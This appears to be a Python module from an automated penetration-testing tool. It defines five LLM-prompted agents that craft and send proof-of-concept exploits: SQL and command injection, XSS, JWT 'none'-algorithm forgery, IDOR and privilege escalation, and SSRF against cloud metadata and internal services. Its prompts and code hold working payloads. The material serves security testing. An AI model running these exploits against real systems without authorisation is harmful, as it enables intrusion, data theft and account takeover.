"""
Exploitation Agents - Proof-of-Concept Execution

Five specialized agents for executing exploits and proving vulnerabilities:
1. InjectionExploitAgent - Execute SQL/Command injection
2. XSSExploitAgent - Execute XSS via browser
3. AuthExploitAgent - Execute authentication bypass
4. AuthzExploitAgent - Execute authorization bypass
5. SSRFExploitAgent - Execute SSRF attacks

Each agent takes a vulnerability queue from the corresponding vuln agent
and attempts to prove each vulnerability with a working exploit.
"""

import asyncio
import json
import logging
import re
from typing import Optional

import httpx

from .agents import ExploitAgent

logger = logging.getLogger("artemis.pentest.exploit")


# =============================================================================
# INJECTION EXPLOIT AGENT
# =============================================================================

INJECTION_EXPLOIT_PROMPT = """You are an expert at crafting and executing injection exploits.

Given a potential injection vulnerability, create a proof-of-concept exploit.

Your task:
1. Analyze the vulnerability details
2. Craft an appropriate payload for the injection type
3. Explain how to verify successful exploitation
4. Provide evidence indicators to look for

For SQL Injection:
- Use UNION-based, error-based, or time-based payloads
- Extract version/database info for proof
- Use time delays (SLEEP, WAITFOR) for blind SQLi

For Command Injection:
- Use command separators (;, |, &&, ||, newline)
- Execute harmless proof commands (id, whoami, hostname)
- Use time delays (sleep, ping) for blind command injection

For SSTI:
- Use math expressions for initial verification
- Escalate to code execution proof

Output your exploit strategy as JSON:
```json
{
  "exploit_type": "sql_injection_union",
  "payload": "' UNION SELECT version(),database(),user() --",
  "verification_method": "Check for database version in response",
  "success_indicators": ["MySQL", "PostgreSQL", "version"],
  "safe_poc": true
}
```
"""


class InjectionExploitAgent(ExploitAgent):
    """Executes injection exploits to prove vulnerabilities."""
    
    agent_name = "injection-exploit"
    agent_role = "Injection Exploit Specialist"
    vuln_type = "injection"
    
    def get_system_prompt(self) -> str:
        return INJECTION_EXPLOIT_PROMPT
    
    def build_exploit_prompt(self, vuln: dict) -> str:
        return f"""Create an exploit strategy for this injection vulnerability:

## Vulnerability Details
- **Title:** {vuln.get('title', 'Unknown')}
- **Endpoint:** {vuln.get('endpoint', 'Unknown')}
- **Method:** {vuln.get('method', 'Unknown')}
- **Parameter:** {vuln.get('parameter', 'Unknown')}
- **Description:** {vuln.get('description', '')}
- **Suggested Payload:** {vuln.get('payload', '')}

Create a safe proof-of-concept that demonstrates the vulnerability without causing damage.
For SQL injection, extract database version or table names.
For command injection, execute harmless commands like 'id' or 'whoami'.
For SSTI, use mathematical expressions to prove code execution.

Output your exploit strategy as JSON.
"""
    
    async def execute_exploit(self, vuln: dict, strategy_json: str) -> dict:
        """Execute injection exploit."""
        try:
            # Parse strategy
            json_match = re.search(r'```json\s*([\s\S]*?)\s*```', strategy_json)
            if not json_match:
                return {"exploited": False, "error": "No JSON strategy found"}
            
            strategy = json.loads(json_match.group(1))
            
            # Build request
            endpoint = vuln.get("endpoint", "/")
            method = vuln.get("method", "GET").upper()
            parameter = vuln.get("parameter", "")
            payload = strategy.get("payload", vuln.get("payload", ""))
            
            url = f"{self.config.target_url.rstrip('/')}{endpoint}"
            
            async with httpx.AsyncClient(timeout=30.0, verify=False) as client:
                if method == "GET":
                    params = {parameter: payload}
                    response = await client.get(url, params=params)
                else:
                    data = {parameter: payload}
                    response = await client.post(url, data=data)
                
                # Check for success indicators
                success_indicators = strategy.get("success_indicators", [])
                response_text = response.text.lower()
                
                for indicator in success_indicators:
                    if indicator.lower() in response_text:
                        return {
                            "exploited": True,
                            "proof": f"Found indicator '{indicator}' in response",
                            "payload": payload,
                            "response_snippet": response.text[:500],
                        }
                
                # Check for error-based SQLi
                sql_errors = [
                    "sql syntax", "mysql", "postgresql", "ora-", "sqlite",
                    "syntax error", "unexpected", "sqlstate",
                ]
                for error in sql_errors:
                    if error in response_text:
                        return {
                            "exploited": True,
                            "proof": f"SQL error message: '{error}'",
                            "payload": payload,
                            "response_snippet": response.text[:500],
                        }
                
                return {
                    "exploited": False,
                    "error": "No success indicators found",
                    "payload": payload,
                }
                
        except Exception as e:
            logger.error(f"Injection exploit failed: {e}")
            return {"exploited": False, "error": str(e)}


# =============================================================================
# XSS EXPLOIT AGENT
# =============================================================================

XSS_EXPLOIT_PROMPT = """You are an expert at crafting and executing XSS exploits.

Given a potential XSS vulnerability, create a proof-of-concept payload.

Your task:
1. Analyze the injection context (HTML body, attribute, script, etc.)
2. Craft an appropriate XSS payload
3. Explain how to verify successful execution
4. Provide DOM evidence to look for

Payload strategies by context:
- HTML body: `<script>alert(document.domain)</script>`
- Attribute: `" onmouseover="alert(1)" x="`
- JavaScript: `';alert(1);//`
- URL: `javascript:alert(1)`
- Event handler: `<img src=x onerror=alert(1)>`

For DOM-based XSS, identify the sink and source.

Output your exploit strategy as JSON:
```json
{
  "exploit_type": "reflected_xss",
  "context": "html_body",
  "payload": "<script>alert(document.domain)</script>",
  "encoded_payload": "%3Cscript%3Ealert(document.domain)%3C/script%3E",
  "verification_method": "Check for unescaped script tag in response",
  "dom_evidence": "script element present in body"
}
```
"""


class XSSExploitAgent(ExploitAgent):
    """Executes XSS exploits to prove vulnerabilities."""
    
    agent_name = "xss-exploit"
    agent_role = "XSS Exploit Specialist"
    vuln_type = "xss"
    
    def get_system_prompt(self) -> str:
        return XSS_EXPLOIT_PROMPT
    
    def build_exploit_prompt(self, vuln: dict) -> str:
        return f"""Create an exploit strategy for this XSS vulnerability:

## Vulnerability Details
- **Title:** {vuln.get('title', 'Unknown')}
- **XSS Type:** {vuln.get('xss_type', 'Unknown')}
- **Endpoint:** {vuln.get('endpoint', 'Unknown')}
- **Method:** {vuln.get('method', 'Unknown')}
- **Parameter:** {vuln.get('parameter', 'Unknown')}
- **Context:** {vuln.get('context', 'Unknown')}
- **Description:** {vuln.get('description', '')}

Create a proof-of-concept XSS payload that demonstrates code execution.
Consider the injection context when crafting the payload.
Use a safe payload like alert(document.domain) for proof.

Output your exploit strategy as JSON.
"""
    
    async def execute_exploit(self, vuln: dict, strategy_json: str) -> dict:
        """Execute XSS exploit."""
        try:
            json_match = re.search(r'```json\s*([\s\S]*?)\s*```', strategy_json)
            if not json_match:
                return {"exploited": False, "error": "No JSON strategy found"}
            
            strategy = json.loads(json_match.group(1))
            
            endpoint = vuln.get("endpoint", "/")
            method = vuln.get("method", "GET").upper()
            parameter = vuln.get("parameter", "")
            payload = strategy.get("payload", vuln.get("payload", ""))
            
            url = f"{self.config.target_url.rstrip('/')}{endpoint}"
            
            async with httpx.AsyncClient(timeout=30.0, verify=False) as client:
                if method == "GET":
                    params = {parameter: payload}
                    response = await client.get(url, params=params)
                else:
                    data = {parameter: payload}
                    response = await client.post(url, data=data)
                
                # Check if payload reflected without encoding
                if payload in response.text:
                    return {
                        "exploited": True,
                        "proof": "Payload reflected without encoding",
                        "payload": payload,
                        "response_snippet": response.text[:500],
                    }
                
                # Check for partial reflection
                core_payload = re.sub(r'[<>"\'()]', '', payload)
                if core_payload and core_payload in response.text:
                    # Check if script tags are present
                    if "<script" in response.text.lower() and "</script>" in response.text.lower():
                        return {
                            "exploited": True,
                            "proof": "Script tags present in response",
                            "payload": payload,
                            "response_snippet": response.text[:500],
                        }
                
                return {
                    "exploited": False,
                    "error": "Payload was encoded or filtered",
                    "payload": payload,
                }
                
        except Exception as e:
            logger.error(f"XSS exploit failed: {e}")
            return {"exploited": False, "error": str(e)}


# =============================================================================
# AUTH EXPLOIT AGENT
# =============================================================================

AUTH_EXPLOIT_PROMPT = """You are an expert at exploiting authentication vulnerabilities.

Given a potential authentication vulnerability, create a proof-of-concept exploit.

Your task:
1. Analyze the authentication mechanism
2. Craft an appropriate bypass technique
3. Explain how to verify successful bypass
4. Provide evidence of successful authentication bypass

Techniques:
- JWT none algorithm: Change alg to "none" and remove signature
- JWT weak secret: Crack secret and forge tokens
- Session fixation: Set session before login
- Password reset token prediction
- Account enumeration via timing
- Default credentials

Output your exploit strategy as JSON:
```json
{
  "exploit_type": "jwt_none_algorithm",
  "payload": {"alg": "none", "typ": "JWT"},
  "steps": [
    "Decode existing JWT",
    "Change algorithm to none",
    "Remove signature",
    "Access protected endpoint"
  ],
  "verification_method": "Successful access to protected resource"
}
```
"""


class AuthExploitAgent(ExploitAgent):
    """Executes authentication bypass exploits."""
    
    agent_name = "auth-exploit"
    agent_role = "Authentication Exploit Specialist"
    vuln_type = "auth"
    
    def get_system_prompt(self) -> str:
        return AUTH_EXPLOIT_PROMPT
    
    def build_exploit_prompt(self, vuln: dict) -> str:
        return f"""Create an exploit strategy for this authentication vulnerability:

## Vulnerability Details
- **Title:** {vuln.get('title', 'Unknown')}
- **Endpoint:** {vuln.get('endpoint', 'Unknown')}
- **Flow:** {vuln.get('flow', 'Unknown')}
- **Description:** {vuln.get('description', '')}
- **Attack Scenario:** {vuln.get('attack_scenario', '')}

Create a proof-of-concept that demonstrates authentication bypass.
Consider JWT manipulation, session attacks, or credential bypass.

Output your exploit strategy as JSON.
"""
    
    async def execute_exploit(self, vuln: dict, strategy_json: str) -> dict:
        """Execute authentication bypass exploit."""
        try:
            json_match = re.search(r'```json\s*([\s\S]*?)\s*```', strategy_json)
            if not json_match:
                return {"exploited": False, "error": "No JSON strategy found"}
            
            strategy = json.loads(json_match.group(1))
            exploit_type = strategy.get("exploit_type", "")
            
            if "jwt" in exploit_type.lower():
                return await self._exploit_jwt(vuln, strategy)
            elif "session" in exploit_type.lower():
                return await self._exploit_session(vuln, strategy)
            else:
                return {
                    "exploited": False,
                    "error": f"Exploit type {exploit_type} not implemented",
                }
                
        except Exception as e:
            logger.error(f"Auth exploit failed: {e}")
            return {"exploited": False, "error": str(e)}
    
    async def _exploit_jwt(self, vuln: dict, strategy: dict) -> dict:
        """Attempt JWT exploitation."""
        import base64
        
        endpoint = vuln.get("endpoint", "/api/protected")
        url = f"{self.config.target_url.rstrip('/')}{endpoint}"
        
        # Create JWT with none algorithm
        header = base64.urlsafe_b64encode(
            json.dumps({"alg": "none", "typ": "JWT"}).encode()
        ).rstrip(b'=').decode()
        
        payload = base64.urlsafe_b64encode(
            json.dumps({"sub": "admin", "role": "admin"}).encode()
        ).rstrip(b'=').decode()
        
        forged_token = f"{header}.{payload}."
        
        async with httpx.AsyncClient(timeout=30.0, verify=False) as client:
            response = await client.get(
                url,
                headers={"Authorization": f"Bearer {forged_token}"},
            )
            
            # Check if we got access
            if response.status_code == 200:
                return {
                    "exploited": True,
                    "proof": "Accessed protected endpoint with forged JWT",
                    "payload": forged_token,
                    "response_code": response.status_code,
                }
            elif response.status_code != 401 and response.status_code != 403:
                return {
                    "exploited": True,
                    "proof": f"Unexpected response code {response.status_code}",
                    "payload": forged_token,
                }
        
        return {"exploited": False, "error": "JWT bypass failed"}
    
    async def _exploit_session(self, vuln: dict, strategy: dict) -> dict:
        """Attempt session-based exploitation."""
        return {"exploited": False, "error": "Session exploit not implemented"}


# =============================================================================
# AUTHZ EXPLOIT AGENT
# =============================================================================

AUTHZ_EXPLOIT_PROMPT = """You are an expert at exploiting authorization vulnerabilities.

Given a potential authorization vulnerability, create a proof-of-concept exploit.

Your task:
1. Identify the authorization bypass type
2. Craft an appropriate attack
3. Explain how to verify successful bypass
4. Provide evidence of unauthorized access

Techniques:
- IDOR: Change numeric IDs in URLs/parameters
- Function-level: Access admin endpoints as regular user
- Privilege escalation: Modify role in request
- Mass assignment: Include role field in updates

Output your exploit strategy as JSON:
```json
{
  "exploit_type": "idor",
  "original_request": "GET /api/users/123",
  "modified_request": "GET /api/users/456",
  "verification_method": "Compare user data - should see different user",
  "evidence_indicators": ["different user id", "different email"]
}
```
"""


class AuthzExploitAgent(ExploitAgent):
    """Executes authorization bypass exploits."""
    
    agent_name = "authz-exploit"
    agent_role = "Authorization Exploit Specialist"
    vuln_type = "authz"
    
    def get_system_prompt(self) -> str:
        return AUTHZ_EXPLOIT_PROMPT
    
    def build_exploit_prompt(self, vuln: dict) -> str:
        return f"""Create an exploit strategy for this authorization vulnerability:

## Vulnerability Details
- **Title:** {vuln.get('title', 'Unknown')}
- **Type:** {vuln.get('authz_type', 'Unknown')}
- **Endpoint:** {vuln.get('endpoint', 'Unknown')}
- **Method:** {vuln.get('method', 'Unknown')}
- **Required Role:** {vuln.get('required_role', 'Unknown')}
- **Description:** {vuln.get('description', '')}
- **Attack Scenario:** {vuln.get('attack_scenario', '')}

Create a proof-of-concept that demonstrates authorization bypass.
For IDOR, show access to another user's resources.
For privilege escalation, show admin access as regular user.

Output your exploit strategy as JSON.
"""
    
    async def execute_exploit(self, vuln: dict, strategy_json: str) -> dict:
        """Execute authorization bypass exploit."""
        try:
            json_match = re.search(r'```json\s*([\s\S]*?)\s*```', strategy_json)
            if not json_match:
                return {"exploited": False, "error": "No JSON strategy found"}
            
            strategy = json.loads(json_match.group(1))
            exploit_type = strategy.get("exploit_type", "")
            
            if "idor" in exploit_type.lower():
                return await self._exploit_idor(vuln, strategy)
            elif "privilege" in exploit_type.lower() or "function" in exploit_type.lower():
                return await self._exploit_privilege_escalation(vuln, strategy)
            else:
                return {
                    "exploited": False,
                    "error": f"Exploit type {exploit_type} not implemented",
                }
                
        except Exception as e:
            logger.error(f"Authz exploit failed: {e}")
            return {"exploited": False, "error": str(e)}
    
    async def _exploit_idor(self, vuln: dict, strategy: dict) -> dict:
        """Attempt IDOR exploitation."""
        endpoint = vuln.get("endpoint", "")
        method = vuln.get("method", "GET").upper()
        
        # Try incrementing/decrementing ID
        id_match = re.search(r'/(\d+)', endpoint)
        if id_match:
            original_id = int(id_match.group(1))
            test_ids = [original_id + 1, original_id - 1, 1, 999]
            
            for test_id in test_ids:
                test_endpoint = re.sub(r'/\d+', f'/{test_id}', endpoint)
                url = f"{self.config.target_url.rstrip('/')}{test_endpoint}"
                
                async with httpx.AsyncClient(timeout=30.0, verify=False) as client:
                    if method == "GET":
                        response = await client.get(url)
                    else:
                        response = await client.request(method, url)
                    
                    if response.status_code == 200:
                        return {
                            "exploited": True,
                            "proof": f"Accessed resource with ID {test_id}",
                            "original_endpoint": endpoint,
                            "exploited_endpoint": test_endpoint,
                            "response_code": response.status_code,
                        }
        
        return {"exploited": False, "error": "IDOR exploit failed"}
    
    async def _exploit_privilege_escalation(self, vuln: dict, strategy: dict) -> dict:
        """Attempt privilege escalation."""
        endpoint = vuln.get("endpoint", "")
        url = f"{self.config.target_url.rstrip('/')}{endpoint}"
        
        async with httpx.AsyncClient(timeout=30.0, verify=False) as client:
            # Try accessing without auth
            response = await client.get(url)
            
            if response.status_code == 200:
                return {
                    "exploited": True,
                    "proof": "Accessed endpoint without proper authorization",
                    "endpoint": endpoint,
                    "response_code": response.status_code,
                }
        
        return {"exploited": False, "error": "Privilege escalation failed"}


# =============================================================================
# SSRF EXPLOIT AGENT
# =============================================================================

SSRF_EXPLOIT_PROMPT = """You are an expert at exploiting SSRF vulnerabilities.

Given a potential SSRF vulnerability, create a proof-of-concept exploit.

Your task:
1. Identify the SSRF vector
2. Craft appropriate payloads for internal access
3. Explain how to verify successful exploitation
4. Identify reachable internal targets

Targets to probe:
- localhost/127.0.0.1 - Local services
- 169.254.169.254 - Cloud metadata (AWS/GCP/Azure)
- Internal IPs - 10.x.x.x, 172.16-31.x.x, 192.168.x.x
- Internal hostnames - redis, mysql, elasticsearch

Output your exploit strategy as JSON:
```json
{
  "exploit_type": "ssrf_cloud_metadata",
  "payloads": [
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:6379/",
    "http://localhost:9200/"
  ],
  "verification_method": "Check response for internal data",
  "success_indicators": ["ami-id", "redis", "elasticsearch"]
}
```
"""


class SSRFExploitAgent(ExploitAgent):
    """Executes SSRF exploits to prove vulnerabilities."""
    
    agent_name = "ssrf-exploit"
    agent_role = "SSRF Exploit Specialist"
    vuln_type = "ssrf"
    
    def get_system_prompt(self) -> str:
        return SSRF_EXPLOIT_PROMPT
    
    def build_exploit_prompt(self, vuln: dict) -> str:
        return f"""Create an exploit strategy for this SSRF vulnerability:

## Vulnerability Details
- **Title:** {vuln.get('title', 'Unknown')}
- **SSRF Type:** {vuln.get('ssrf_type', 'Unknown')}
- **Endpoint:** {vuln.get('endpoint', 'Unknown')}
- **Method:** {vuln.get('method', 'Unknown')}
- **Parameter:** {vuln.get('parameter', 'Unknown')}
- **Description:** {vuln.get('description', '')}
- **Reachable Targets:** {vuln.get('reachable_targets', [])}

Create proof-of-concept SSRF payloads targeting:
1. Cloud metadata (AWS/GCP/Azure)
2. Local services (localhost)
3. Internal network services

Output your exploit strategy as JSON.
"""
    
    async def execute_exploit(self, vuln: dict, strategy_json: str) -> dict:
        """Execute SSRF exploit."""
        try:
            json_match = re.search(r'```json\s*([\s\S]*?)\s*```', strategy_json)
            if not json_match:
                return {"exploited": False, "error": "No JSON strategy found"}
            
            strategy = json.loads(json_match.group(1))
            
            endpoint = vuln.get("endpoint", "/")
            method = vuln.get("method", "POST").upper()
            parameter = vuln.get("parameter", "url")
            
            payloads = strategy.get("payloads", [
                "http://169.254.169.254/latest/meta-data/",
                "http://127.0.0.1:80/",
                "http://localhost:22/",
            ])
            
            url = f"{self.config.target_url.rstrip('/')}{endpoint}"
            
            async with httpx.AsyncClient(timeout=30.0, verify=False) as client:
                for payload in payloads:
                    try:
                        if method == "GET":
                            params = {parameter: payload}
                            response = await client.get(url, params=params)
                        else:
                            data = {parameter: payload}
                            response = await client.post(url, data=data)
                        
                        # Check for internal data indicators
                        response_lower = response.text.lower()
                        
                        # Cloud metadata indicators
                        if any(ind in response_lower for ind in ["ami-id", "instance-id", "security-credentials"]):
                            return {
                                "exploited": True,
                                "proof": "Retrieved cloud metadata",
                                "payload": payload,
                                "response_snippet": response.text[:500],
                            }
                        
                        # Internal service indicators
                        if any(ind in response_lower for ind in ["redis", "ssh-", "elasticsearch", "mongodb"]):
                            return {
                                "exploited": True,
                                "proof": "Reached internal service",
                                "payload": payload,
                                "response_snippet": response.text[:500],
                            }
                        
                        # Different response than normal (blind SSRF indicator)
                        if len(response.text) > 0 and response.status_code == 200:
                            if "169.254" in payload or "127.0.0.1" in payload or "localhost" in payload:
                                return {
                                    "exploited": True,
                                    "proof": "Got response from internal target",
                                    "payload": payload,
                                    "response_code": response.status_code,
                                }
                                
                    except Exception as e:
                        logger.debug(f"SSRF payload {payload} failed: {e}")
                        continue
            
            return {"exploited": False, "error": "No SSRF payloads successful"}
                
        except Exception as e:
            logger.error(f"SSRF exploit failed: {e}")
            return {"exploited": False, "error": str(e)}
